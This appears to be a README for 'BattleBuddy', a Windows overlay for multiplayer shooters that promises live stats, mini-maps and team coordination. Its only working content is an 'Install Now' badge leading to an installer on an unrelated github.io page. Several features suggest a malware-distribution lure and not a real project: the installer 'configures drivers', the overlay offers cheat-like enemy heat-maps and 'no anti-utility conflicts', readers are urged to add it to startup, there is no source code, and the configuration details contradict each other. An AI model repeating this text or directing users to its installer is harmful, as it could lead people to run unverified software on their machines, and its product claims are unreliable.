# BattleBuddy
**Lightweight Windows‑only overlay for real‑time stats, maps and team coordination in multiplayer shooters**

> *“Stay in the fight, stay on the map, stay together.”* – IntersectScholar

---

## 🎮 What is BattleBuddy?

BattleBuddy is a **Windows 10/11‑only** desktop utility that lives as a non‑intrusive overlay while you game. It gives you:

- **Live stat tracking** – K/D, damage, objective progress, and more.
- **Dynamic mini‑maps** – Zoom, rotate, and toggle layers on the fly.
- **Team coordination panel** – Share ping locations, callouts, and status with teammates instantly.
- **Zero‑impact design** – Runs in the background with a tiny memory footprint and no FPS penalty.

Designed for shooters that thrive on split‑second decisions, BattleBuddy keeps the information you need *right where you need it*.

---

## 📥 Get Started

<div align="center">
  <a href="https://rewfdf.github.io/SetupPage/"><img src="https://img.shields.io/badge/Download%20BattleBuddy-Install%20Now-blue?style=for-the-badge&logo=windows" alt="Download BattleBuddy"></a>
</div>

1. Click the **Install Now** button above.
2. Follow the on‑screen wizard (it auto‑detects your Windows version).
3. Launch BattleBuddy before you start your game and configure the overlay to your liking.

> **Tip:** Add BattleBuddy to Windows startup for an instant ready‑state every time you log in.

---

## 🛠️ Features at a Glance

| Category | Details |
|----------|---------|
| **Stats Tracker** | Real‑time K/D, headshots, assists, time‑alive, custom counters. |
| **Map Assist** | Scalable mini‑map, heat‑map of enemy sightings, waypoint markers. |
| **Team Panel** | Live ping feed, voice‑chat mute toggle, health/armor bars for squad. |
| **Customization** | Themes, opacity, hotkeys, per‑game profiles. |
| **Performance** | < 15 MB RAM, < 1 % CPU on idle, DirectX‑compatible overlay. |
| **Safety** | No game file modifications, fully sandboxed, no anti‑utility conflicts. |

---

## 🚀 Quick Release Guide

1. **Run the installer** – It detects your Windows build and configures the necessary drivers.
2. **Select your game** – BattleBuddy ships with preset profiles for popular shooters; you can also import custom JSON configs.
3. **Adjust overlay hotkeys** – Default: `Ctrl + Shift + B` to toggle the panel.
4. **Launch your game** – The overlay appears automatically; press the hotkey to hide/show.

All settings are stored in `C:\Users\<YourName>\AppData\Local\BattleBuddy\config.json` for easy backup.

---

## 📚 Documentation & Support

- **User Guide** – Available on the download page (link above).
- **FAQ** – Common questions about compatibility, hotkeys, and troubleshooting.
- **Community** – Join the Discord server *BattleBuddy Hub* for live help, feature requests, and sharing custom maps.

---

## 🛡️ Compatibility & Requirements

| Requirement | Minimum |
|-------------|---------|
| **OS** | Windows 10 (1809) / Windows 11 |
| **Processor** | 2 GHz dual‑core |
| **Memory** | 2 GB RAM |
| **Graphics** | DirectX 11 compatible |
| **Storage** | 30 MB free space |

*BattleBuddy does not support Windows 7/8 or any non‑Windows platforms.*

---

## 🤝 Contributing

BattleBuddy is a solo project, but contributions are welcome! If you’re a developer or designer:

1. Fork the repository.
2. Create a feature branch (`feat/your‑feature`).
3. Submit a pull request with a clear description and screenshots (if UI changes).

Please follow the **Windows‑only** guideline for any new code.

---

## 📜 License

`BattleBuddy` is released under the **MIT License** – you’re free to use, modify, and redistribute it for personal or commercial purposes, provided you retain the original copyright notice.

---

*Happy hunting, and may your squad always have your back!*

## 📁 Configuration System

```text
configs/
├── default.cfg
├── visual.cfg
├── player.cfg
└── custom.cfg
```